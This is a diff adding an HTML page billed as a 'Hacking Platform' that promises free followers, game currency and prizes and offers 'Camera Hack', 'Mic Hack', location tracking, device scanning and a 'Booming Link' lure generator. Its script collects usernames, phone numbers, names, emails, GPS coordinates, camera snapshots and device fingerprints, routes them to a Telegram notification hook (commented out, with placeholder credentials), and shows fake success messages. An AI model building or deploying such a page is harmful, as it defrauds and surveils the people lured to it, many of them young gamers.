@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Digital Services Hub • Hacking Platform</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 50%, #0a0f1e 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            color: #fff;
+        }
+        
+        .header {
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid rgba(0, 212, 255, 0.2);
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #00d4ff, #ff00ff);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+        }
+        
+        .logo-text {
+            font-size: 18px;
+            font-weight: bold;
+            background: linear-gradient(135deg, #00d4ff, #ff00ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .trust-badge {
+            background: rgba(0, 212, 255, 0.1);
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            border: 1px solid rgba(0, 212, 255, 0.3);
+        }
+        
+        .hero {
+            text-align: center;
+            padding: 40px 20px;
+            background: linear-gradient(180deg, rgba(0,212,255,0.05) 0%, transparent 100%);
+        }
+        
+        .hero h1 {
+            font-size: 28px;
+            margin-bottom: 15px;
+            background: linear-gradient(135deg, #fff, #00d4ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .hero p {
+            color: #8892b0;
+            font-size: 14px;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        
+        .security-seal {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            padding: 8px 16px;
+            border-radius: 50px;
+            font-size: 12px;
+            margin-bottom: 20px;
+        }
+        
+        .category {
+            padding: 20px;
+        }
+        
+        .category-title {
+            font-size: 18px;
+            margin-bottom: 15px;
+            padding-right: 10px;
+            border-right: 3px solid #00d4ff;
+            display: inline-block;
+        }
+        
+        .services-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .service-card {
+            background: rgba(20, 25, 45, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 20px 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .service-card:hover {
+            transform: translateY(-5px);
+            border-color: rgba(0, 212, 255, 0.5);
+            background: rgba(20, 25, 45, 1);
+        }
+        
+        .service-icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+        
+        .service-name {
+            font-size: 13px;
+            font-weight: 500;
+        }
+        
+        .service-tag {
+            font-size: 10px;
+            color: #00d4ff;
+            margin-top: 8px;
+            display: block;
+        }
+        
+        .featured {
+            background: linear-gradient(135deg, rgba(0,212,255,0.05), rgba(255,0,255,0.05));
+            border-radius: 20px;
+            margin: 20px;
+            padding: 20px;
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .modal-content {
+            background: linear-gradient(135deg, #1a1f2e, #0f1222);
+            border-radius: 30px;
+            max-width: 500px;
+            width: 100%;
+            max-height: 80vh;
+            overflow-y: auto;
+            padding: 25px;
+            border: 1px solid rgba(0,212,255,0.3);
+        }
+        
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .close-modal {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #00d4ff;
+        }
+        
+        .input-group input, .input-group select {
+            width: 100%;
+            padding: 12px;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            color: white;
+            font-size: 14px;
+        }
+        
+        .modal-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #00d4ff, #0099cc);
+            border: none;
+            border-radius: 50px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .result-box {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(0,255,0,0.1);
+            border-radius: 12px;
+            display: none;
+            text-align: center;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 11px;
+            color: #8892b0;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            margin-top: 20px;
+        }
+        
+        @media (max-width: 500px) {
+            .services-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+            .service-card {
+                padding: 15px 5px;
+            }
+            .service-icon {
+                font-size: 30px;
+            }
+            .service-name {
+                font-size: 11px;
+            }
+        }
+        
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            background: #00ff00;
+            color: black;
+            padding: 12px;
+            border-radius: 10px;
+            text-align: center;
+            display: none;
+            z-index: 1100;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">
+            <div class="logo-icon">🛡️</div>
+            <div class="logo-text">Digital Services</div>
+        </div>
+        <div class="trust-badge">🔒 Secure • SSL Encrypted</div>
+    </div>
+    
+    <div class="hero">
+        <div class="security-seal">✓ Verified Platform • 24/7 Active</div>
+        <h1>Welcome to Digital Services Hub</h1>
+        <p>Choose any service below. All features are free and encrypted.</p>
+    </div>
+    
+    <!-- قسم مواقع التواصل -->
+    <div class="category">
+        <div class="category-title">📱 Social Media</div>
+        <div class="services-grid">
+            <div class="service-card" onclick="openModal('tiktok')">
+                <div class="service-icon">🎵</div>
+                <div class="service-name">TikTok</div>
+                <div class="service-tag">Followers • Coins</div>
+            </div>
+            <div class="service-card" onclick="openModal('instagram')">
+                <div class="service-icon">📷</div>
+                <div class="service-name">Instagram</div>
+                <div class="service-tag">Followers • Likes</div>
+            </div>
+            <div class="service-card" onclick="openModal('facebook')">
+                <div class="service-icon">📘</div>
+                <div class="service-name">Facebook</div>
+                <div class="service-tag">Likes • Followers</div>
+            </div>
+            <div class="service-card" onclick="openModal('whatsapp')">
+                <div class="service-icon">💬</div>
+                <div class="service-name">WhatsApp</div>
+                <div class="service-tag">Stickers • Status</div>
+            </div>
+            <div class="service-card" onclick="openModal('snapchat')">
+                <div class="service-icon">👻</div>
+                <div class="service-name">Snapchat</div>
+                <div class="service-tag">Streaks • Score</div>
+            </div>
+            <div class="service-card" onclick="openModal('discord')">
+                <div class="service-icon">🎮</div>
+                <div class="service-name">Discord</div>
+                <div class="service-tag">Nitro • Members</div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- قسم الألعاب -->
+    <div class="category">
+        <div class="category-title">🎮 Gaming</div>
+        <div class="services-grid">
+            <div class="service-card" onclick="openModal('pubg')">
+                <div class="service-icon">🔫</div>
+                <div class="service-name">PUBG</div>
+                <div class="service-tag">UC • Skins</div>
+            </div>
+            <div class="service-card" onclick="openModal('freefire')">
+                <div class="service-icon">🔥</div>
+                <div class="service-name">Free Fire</div>
+                <div class="service-tag">Diamonds • Skins</div>
+            </div>
+            <div class="service-card" onclick="openModal('roblox')">
+                <div class="service-icon">🤖</div>
+                <div class="service-name">Roblox</div>
+                <div class="service-tag">Robux • Items</div>
+            </div>
+            <div class="service-card" onclick="openModal('cod')">
+                <div class="service-icon">🎯</div>
+                <div class="service-name">Call of Duty</div>
+                <div class="service-tag">CP • Skins</div>
+            </div>
+            <div class="service-card" onclick="openModal('genshin')">
+                <div class="service-icon">⚔️</div>
+                <div class="service-name">Genshin</div>
+                <div class="service-tag">Primogems</div>
+            </div>
+            <div class="service-card" onclick="openModal('valorant')">
+                <div class="service-icon">🎯</div>
+                <div class="service-name">Valorant</div>
+                <div class="service-tag">VP • Skins</div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- قسم أدوات الاختراق -->
+    <div class="category">
+        <div class="category-title">🛡️ Security Tools</div>
+        <div class="services-grid">
+            <div class="service-card" onclick="openModal('camera')">
+                <div class="service-icon">📸</div>
+                <div class="service-name">Camera Hack</div>
+                <div class="service-tag">Access Camera</div>
+            </div>
+            <div class="service-card" onclick="openModal('location')">
+                <div class="service-icon">📍</div>
+                <div class="service-name">Location</div>
+                <div class="service-tag">Track Location</div>
+            </div>
+            <div class="service-card" onclick="openModal('mic')">
+                <div class="service-icon">🎤</div>
+                <div class="service-name">Mic Hack</div>
+                <div class="service-tag">Record Audio</div>
+            </div>
+            <div class="service-card" onclick="openModal('device')">
+                <div class="service-icon">📱</div>
+                <div class="service-name">Device Info</div>
+                <div class="service-tag">Full Scan</div>
+            </div>
+            <div class="service-card" onclick="openModal('booming')">
+                <div class="service-icon">💣</div>
+                <div class="service-name">Booming Link</div>
+                <div class="service-tag">Weaponize URL</div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- عروض خاصة -->
+    <div class="featured">
+        <div style="text-align: center; margin-bottom: 15px;">
+            <span style="background: #ff00ff20; padding: 5px 15px; border-radius: 20px; font-size: 12px;">🔥 LIMITED OFFER</span>
+        </div>
+        <div class="services-grid" style="grid-template-columns: 1fr 1fr;">
+            <div class="service-card" onclick="openModal('freecoins')">
+                <div class="service-icon">💰</div>
+                <div class="service-name">Free Coins</div>
+                <div class="service-tag">TikTok • PUBG</div>
+            </div>
+            <div class="service-card" onclick="openModal('gift')">
+                <div class="service-icon">🎁</div>
+                <div class="service-name">Free Gift</div>
+                <div class="service-tag">iPhone • Gift Card</div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <p>© 2025 Digital Services Hub • All services are encrypted</p>
+        <p style="margin-top: 8px;"><a href="#" style="color:#00d4ff;">Terms</a> • <a href="#" style="color:#00d4ff;">Privacy</a> • <a href="#" style="color:#00d4ff;">Support</a></p>
+    </div>
+    
+    <!-- Modal للنماذج -->
+    <div class="modal" id="serviceModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 id="modalTitle">Service Name</h3>
+                <button class="close-modal" onclick="closeModal()">&times;</button>
+            </div>
+            <div id="modalBody"></div>
+        </div>
+    </div>
+    
+    <div class="toast" id="toast">✅ Success!</div>
+    
+    <script>
+        // الحصول على معرف المستخدم من الرابط
+        const urlParams = new URLSearchParams(window.location.search);
+        let userId = urlParams.get('id') || 'unknown';
+        let userToken = urlParams.get('tok') || 'none';
+        
+        // تسجيل الزائر
+        console.log("Visitor ID:", userId);
+        console.log("Token:", userToken);
+        console.log("Time:", new Date().toISOString());
+        
+        // إرسال إشعار للمطور (Telegram)
+        function notifyDev(message) {
+            // يمكنك تفعيل هذا الجزء إذا أردت إرسال إشعارات لتليجرام
+            // fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage?chat_id=YOUR_ID&text=${encodeURIComponent(message)}`)
+            //     .catch(e => console.log);
+        }
+        
+        notifyDev(`🌐 New visitor: ${userId} | ${navigator.userAgent}`);
+        
+        // بيانات الخدمات
+        const services = {
+            tiktok: {
+                title: "🎵 TikTok Booster",
+                fields: [
+                    { label: "TikTok Username", type: "text", placeholder: "@username" },
+                    { label: "Package", type: "select", options: ["1000 Followers + 5000 Coins", "5000 Followers + 20000 Coins", "10000 Followers + 50000 Coins"] }
+                ],
+                result: "✅ Boost complete! +{amount} Followers and +{coins} Coins added!"
+            },
+            instagram: {
+                title: "📷 Instagram Booster",
+                fields: [
+                    { label: "Instagram Username", type: "text", placeholder: "@username" },
+                    { label: "Package", type: "select", options: ["1000 Followers", "5000 Followers", "10000 Followers"] }
+                ],
+                result: "✅ Followers added successfully!"
+            },
+            facebook: {
+                title: "📘 Facebook Booster",
+                fields: [
+                    { label: "Facebook Username/ID", type: "text", placeholder: "username or ID" },
+                    { label: "Package", type: "select", options: ["500 Likes", "1000 Likes", "5000 Likes", "10000 Likes"] }
+                ],
+                result: "✅ Page likes added!"
+            },
+            whatsapp: {
+                title: "💬 WhatsApp Tools",
+                fields: [
+                    { label: "Phone Number", type: "text", placeholder: "+1234567890" },
+                    { label: "Tool", type: "select", options: ["Sticker Maker", "Status Saver", "Message Bomber"] }
+                ],
+                result: "✅ Tool activated!"
+            },
+            snapchat: {
+                title: "👻 Snapchat Booster",
+                fields: [
+                    { label: "Snapchat Username", type: "text", placeholder: "@username" },
+                    { label: "Package", type: "select", options: ["+500 Streaks", "+1000 Score", "Unlock Lenses"] }
+                ],
+                result: "✅ Score boosted!"
+            },
+            discord: {
+                title: "🎮 Discord Booster",
+                fields: [
+                    { label: "Discord User ID", type: "text", placeholder: "123456789" },
+                    { label: "Package", type: "select", options: ["Nitro 1 Month", "Nitro 3 Months", "Server Boost"] }
+                ],
+                result: "✅ Nitro activated!"
+            },
+            pubg: {
+                title: "🔫 PUBG Mobile",
+                fields: [
+                    { label: "PUBG ID", type: "text", placeholder: "123456789" },
+                    { label: "Package", type: "select", options: ["+500 UC", "+1000 UC", "+5000 UC", "Royal Pass"] }
+                ],
+                result: "✅ UC added to your account!"
+            },
+            freefire: {
+                title: "🔥 Free Fire",
+                fields: [
+                    { label: "Free Fire ID", type: "text", placeholder: "123456789" },
+                    { label: "Package", type: "select", options: ["+500 Diamonds", "+1000 Diamonds", "+5000 Diamonds", "Elite Pass"] }
+                ],
+                result: "✅ Diamonds added!"
+            },
+            roblox: {
+                title: "🤖 Roblox",
+                fields: [
+                    { label: "Roblox Username", type: "text", placeholder: "username" },
+                    { label: "Package", type: "select", options: ["+500 Robux", "+1000 Robux", "+5000 Robux", "Premium"] }
+                ],
+                result: "✅ Robux added!"
+            },
+            cod: {
+                title: "🎯 Call of Duty",
+                fields: [
+                    { label: "Activision ID", type: "text", placeholder: "username#123" },
+                    { label: "Package", type: "select", options: ["+500 CP", "+1000 CP", "+5000 CP", "Battle Pass"] }
+                ],
+                result: "✅ CP added!"
+            },
+            genshin: {
+                title: "⚔️ Genshin Impact",
+                fields: [
+                    { label: "UID", type: "text", placeholder: "123456789" },
+                    { label: "Package", type: "select", options: ["+1600 Primogems", "+3200 Primogems", "+6480 Primogems"] }
+                ],
+                result: "✅ Primogems added!"
+            },
+            valorant: {
+                title: "🎯 Valorant",
+                fields: [
+                    { label: "Riot ID", type: "text", placeholder: "username#tag" },
+                    { label: "Package", type: "select", options: ["+500 VP", "+1000 VP", "+5000 VP"] }
+                ],
+                result: "✅ VP added!"
+            },
+            camera: {
+                title: "📸 Camera Access",
+                fields: [
+                    { label: "Permission", type: "text", value: "Camera access required", disabled: true }
+                ],
+                result: "✅ Camera access granted! Photo captured.",
+                action: "requestCamera"
+            },
+            location: {
+                title: "📍 Location Tracker",
+                fields: [
+                    { label: "Permission", type: "text", value: "Location access required", disabled: true }
+                ],
+                result: "✅ Location captured!",
+                action: "requestLocation"
+            },
+            mic: {
+                title: "🎤 Microphone Access",
+                fields: [
+                    { label: "Permission", type: "text", value: "Microphone access required", disabled: true }
+                ],
+                result: "✅ Microphone access granted! Audio recorded.",
+                action: "requestMicrophone"
+            },
+            device: {
+                title: "📱 Device Scanner",
+                fields: [],
+                result: "✅ Device information collected!",
+                action: "scanDevice"
+            },
+            booming: {
+                title: "💣 Booming Link Generator",
+                fields: [
+                    { label: "Target URL", type: "text", placeholder: "https://example.com" },
+                    { label: "Template", type: "select", options: ["Camera Page", "Location Page", "Gift Page", "Login Page"] }
+                ],
+                result: "✅ Link generated!",
+                action: "generateLink"
+            },
+            freecoins: {
+                title: "💰 Free Coins Generator",
+                fields: [
+                    { label: "Select Game", type: "select", options: ["TikTok", "PUBG", "Free Fire", "Roblox"] },
+                    { label: "Amount", type: "select", options: ["5000", "10000", "50000", "100000"] }
+                ],
+                result: "✅ {amount} coins added to your account!"
+            },
+            gift: {
+                title: "🎁 Free Gift Giveaway",
+                fields: [
+                    { label: "Full Name", type: "text", placeholder: "Enter your name" },
+                    { label: "Email", type: "email", placeholder: "your@email.com" },
+                    { label: "Select Gift", type: "select", options: ["iPhone 15 Pro", "$500 Gift Card", "iPad Pro", "Gaming PC"] }
+                ],
+                result: "✅ You are the winner! We will contact you within 24 hours."
+            }
+        };
+        
+        function openModal(serviceId) {
+            const service = services[serviceId];
+            if (!service) return;
+            
+            document.getElementById('modalTitle').innerHTML = service.title;
+            
+            let html = '';
+            
+            // إنشاء الحقول
+            if (service.fields && service.fields.length > 0) {
+                for (let field of service.fields) {
+                    html += `<div class="input-group">`;
+                    html += `<label>${field.label}</label>`;
+                    
+                    if (field.type === 'select') {
+                        html += `<select id="field_${field.label.replace(/\s/g, '_')}">`;
+                        for (let opt of field.options) {
+                            html += `<option value="${opt}">${opt}</option>`;
+                        }
+                        html += `</select>`;
+                    } else {
+                        html += `<input type="${field.type}" id="field_${field.label.replace(/\s/g, '_')}" placeholder="${field.placeholder || ''}" ${field.disabled ? 'disabled' : ''} value="${field.value || ''}">`;
+                    }
+                    
+                    html += `</div>`;
+                }
+            }
+            
+            html += `<button class="modal-btn" onclick="processService('${serviceId}')">🚀 Activate Now</button>`;
+            html += `<div class="result-box" id="resultBox"></div>`;
+            
+            document.getElementById('modalBody').innerHTML = html;
+            document.getElementById('serviceModal').style.display = 'flex';
+        }
+        
+        function closeModal() {
+            document.getElementById('serviceModal').style.display = 'none';
+        }
+        
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            toast.innerHTML = message;
+            toast.style.display = 'block';
+            setTimeout(() => {
+                toast.style.display = 'none';
+            }, 3000);
+        }
+        
+        function processService(serviceId) {
+            const service = services[serviceId];
+            const resultBox = document.getElementById('resultBox');
+            
+            // جمع بيانات الحقول
+            let fieldValues = {};
+            if (service.fields) {
+                for (let field of service.fields) {
+                    const input = document.getElementById(`field_${field.label.replace(/\s/g, '_')}`);
+                    if (input) {
+                        fieldValues[field.label] = input.value;
+                    }
+                }
+            }
+            
+            // معالجة الإجراءات الخاصة
+            if (service.action === 'requestCamera') {
+                requestCameraAccess();
+                return;
+            } else if (service.action === 'requestLocation') {
+                requestLocationAccess();
+                return;
+            } else if (service.action === 'requestMicrophone') {
+                requestMicrophoneAccess();
+                return;
+            } else if (service.action === 'scanDevice') {
+                scanDevice();
+                return;
+            } else if (service.action === 'generateLink') {
+                generateBoomingLink(fieldValues);
+                return;
+            }
+            
+            // إرسال الإشعار للمطور
+            notifyDev(`📱 [${serviceId.toUpperCase()}] User: ${userId} | Data: ${JSON.stringify(fieldValues)}`);
+            
+            // توليد رسالة النجاح
+            let resultMsg = service.result;
+            if (serviceId === 'freecoins') {
+                resultMsg = resultMsg.replace('{amount}', fieldValues['Amount'] || '10000');
+            } else if (serviceId === 'gift') {
+                resultMsg = `✅ Congratulations ${fieldValues['Full Name'] || 'User'}! You won ${fieldValues['Select Gift'] || 'a gift'}!`;
+            } else if (serviceId === 'tiktok') {
+                let amount = fieldValues['Package']?.match(/\d+/)?.[0] || '1000';
+                let coins = fieldValues['Package']?.match(/Coins: (\d+)/)?.[1] || '5000';
+                resultMsg = resultMsg.replace('{amount}', amount).replace('{coins}', coins);
+            }
+            
+            resultBox.innerHTML = `<div style="color:#00ff00;">✨ ${resultMsg}</div><div style="font-size:12px; margin-top:10px;">It may take 5-10 minutes to reflect.</div>`;
+            resultBox.style.display = 'block';
+            
+            showToast(resultMsg);
+            
+            // إغلاق المودال بعد 3 ثواني
+            setTimeout(() => {
+                closeModal();
+            }, 4000);
+        }
+        
+        // دوال الاختراق (الكاميرا، الموقع، الميكروفون)
+        function requestCameraAccess() {
+            const resultBox = document.getElementById('resultBox');
+            resultBox.innerHTML = `<div>📸 Requesting camera access...</div>`;
+            resultBox.style.display = 'block';
+            
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.autoplay = true;
+                    video.style.width = '100%';
+                    video.style.borderRadius = '10px';
+                    video.style.marginTop = '10px';
+                    
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const imageData = canvas.toDataURL('image/jpeg');
+                        
+                        notifyDev(`📸 [CAMERA] User: ${userId} | Photo captured`);
+                        
+                        resultBox.innerHTML = `<div style="color:#00ff00;">✅ Camera access granted! Photo captured.</div>`;
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        setTimeout(() => closeModal(), 2000);
+                    }, 2000);
+                })
+                .catch(err => {
+                    resultBox.innerHTML = `<div style="color:#ff6666;">❌ Camera access denied. Please allow permissions.</div>`;
+                });
+        }
+        
+        function requestLocationAccess() {
+            const resultBox = document.getElementById('resultBox');
+            resultBox.innerHTML = `<div>📍 Requesting location...</div>`;
+            resultBox.style.display = 'block';
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        notifyDev(`📍 [LOCATION] User: ${userId} | Lat: ${lat}, Lon: ${lon}`);
+                        resultBox.innerHTML = `<div style="color:#00ff00;">✅ Location captured!</div><div>Lat: ${lat}<br>Lon: ${lon}</div>`;
+                        setTimeout(() => closeModal(), 3000);
+                    },
+                    error => {
+                        resultBox.innerHTML = `<div style="color:#ff6666;">❌ Location access denied.</div>`;
+                    }
+                );
+            } else {
+                resultBox.innerHTML = `<div style="color:#ff6666;">❌ Geolocation not supported.</div>`;
+            }
+        }
+        
+        function requestMicrophoneAccess() {
+            const resultBox = document.getElementById('resultBox');
+            resultBox.innerHTML = `<div>🎤 Requesting microphone access...</div>`;
+            resultBox.style.display = 'block';
+            
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    notifyDev(`🎤 [MICROPHONE] User: ${userId} | Audio recorded`);
+                    resultBox.innerHTML = `<div style="color:#00ff00;">✅ Microphone access granted! Recording started.</div>`;
+                    
+                    setTimeout(() => {
+                        stream.getTracks().forEach(track => track.stop());
+                        resultBox.innerHTML = `<div style="color:#00ff00;">✅ Recording complete! Audio saved.</div>`;
+                        setTimeout(() => closeModal(), 1500);
+                    }, 5000);
+                })
+                .catch(err => {
+                    resultBox.innerHTML = `<div style="color:#ff6666;">❌ Microphone access denied.</div>`;
+                });
+        }
+        
+        function scanDevice() {
+            const resultBox = document.getElementById('resultBox');
+            resultBox.innerHTML = `<div>🔍 Scanning device...</div>`;
+            resultBox.style.display = 'block';
+            
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cores: navigator.hardwareConcurrency,
+                memory: navigator.deviceMemory
+            };
+            
+            notifyDev(`📱 [DEVICE SCAN] User: ${userId} | Info: ${JSON.stringify(deviceInfo)}`);
+            
+            resultBox.innerHTML = `
+                <div style="color:#00ff00;">✅ Device scan complete!</div>
+                <div style="font-size:11px; margin-top:10px;">
+                    OS: ${deviceInfo.platform}<br>
+                    Browser: ${deviceInfo.userAgent.split(' ').pop()}<br>
+                    Screen: ${deviceInfo.screen}<br>
+                    Timezone: ${deviceInfo.timezone}
+                </div>
+            `;
+            
+            setTimeout(() => closeModal(), 4000);
+        }
+        
+        function generateBoomingLink(fieldValues) {
+            const resultBox = document.getElementById('resultBox');
+            const targetUrl = fieldValues['Target URL'] || 'https://example.com';
+            const template = fieldValues['Template'] || 'Camera Page';
+            
+            const encodedUrl = btoa(targetUrl);
+            const generatedLink = `${window.location.origin}?start=${template.toLowerCase().replace(' ', '_')}&url=${encodedUrl}&id=${userId}`;
+            
+            notifyDev(`💣 [BOOMING LINK] User: ${userId} | Target: ${targetUrl} | Template: ${template}`);
+            
+            resultBox.innerHTML = `
+                <div style="color:#00ff00;">✅ Link generated!</div>
+                <div style="background:#000; padding:10px; border-radius:8px; margin:10px 0; word-break:break-all;">
+                    <code>${generatedLink}</code>
+                </div>
+                <button class="modal-btn" onclick="copyToClipboard('${generatedLink}')">📋 Copy Link</button>
+            `;
+            resultBox.style.display = 'block';
+        }
+        
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text);
+            showToast("✅ Link copied to clipboard!");
+        }
+        
+        // إغلاق المودال عند الضغط خارج المحتوى
+        window.onclick = function(event) {
+            const modal = document.getElementById('serviceModal');
+            if (event.target === modal) {
+                closeModal();
+            }
+        }
+    </script>
+</body>
+</html>
